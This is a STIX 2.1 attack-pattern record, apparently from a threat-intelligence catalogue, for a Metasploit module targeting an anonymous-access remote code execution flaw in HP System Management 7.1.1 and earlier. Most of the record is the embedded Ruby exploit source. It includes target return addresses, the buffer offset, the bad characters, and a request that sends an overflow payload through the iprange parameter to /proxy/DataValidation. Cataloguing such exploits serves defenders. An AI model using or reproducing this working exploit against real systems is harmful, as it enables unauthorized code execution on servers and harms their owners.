{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--41c023ad-2256-4cc0-abe3-9434db332448",
    "created": "2024-08-14T17:01:47.282076Z",
    "modified": "2024-08-14T17:01:47.282081Z",
    "name": "HP System Management Anonymous Access Code Execution",
    "description": " This module exploits an anonymous remote code execution on HP System Management 7.1.1 and earlier. The vulnerability exists when handling the iprange parameter on a request against /proxy/DataValidation. In order to work HP System Management must be configured with Anonymous access enabled. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/hp_system_management.rb",
            "external_id": "hp_system_management.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  HttpFingerprint = { :pattern => [ /HP System Management Homepage/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP System Management Anonymous Access Code Execution',\n      'Description'    => %q{\n          This module exploits an anonymous remote code execution on HP System Management\n        7.1.1 and earlier. The vulnerability exists when handling the iprange parameter on\n        a request against /proxy/DataValidation. In order to work HP System Management must\n        be configured with Anonymous access enabled.\n      },\n      'Author'         => [ 'agix' ], # @agixid\n      'License'        => MSF_LICENSE,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1000,\n          'BadChars' => \"\\x00\\x25\\x0a\\x0b\\x0d\\x3a\\x3b\\x09\\x0c\\x23\\x20\",\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ESP' # See the comments below\n            }\n        },\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_X86,\n      'References'\t =>\n        [\n          ['OSVDB', '91812']\n        ],\n      'Targets'        =>\n        [\n          [ 'HP System Management 7.1.1 - Linux (CentOS)',\n            {\n              'Ret' => 0x8054e14, # push esp / ret\n              'Offset' => 267\n            }\n          ],\n          [ 'HP System Management 6.3.0 - Linux (CentOS)',\n            {\n              'Ret' => 0x805a547, # push esp / ret\n              'Offset' => 267\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-09-01',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(2381),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ])\n\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => \"/cpqlogin.htm\"\n    })\n\n    if res.nil?\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    elsif res.code == 200 and res.body =~ /\"HP System Management Homepage v(.*)\"/\n      version = $1\n      return Exploit::CheckCode::Appears if version <= \"7.1.1.1\"\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    padding = rand_text_alpha(target['Offset'])\n    ret = [target['Ret']].pack('V')\n    iprange = \"a-bz\"+padding+ret+payload.encoded\n\n    print_status(\"#{rhost}:#{rport} - Sending exploit...\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => \"/proxy/DataValidation\",\n      'encode_params' => false,\n      'vars_get' => {\n        'iprange' => iprange\n      }\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-01",
    "x_mitre_platforms": [
        "['linux']"
    ]
}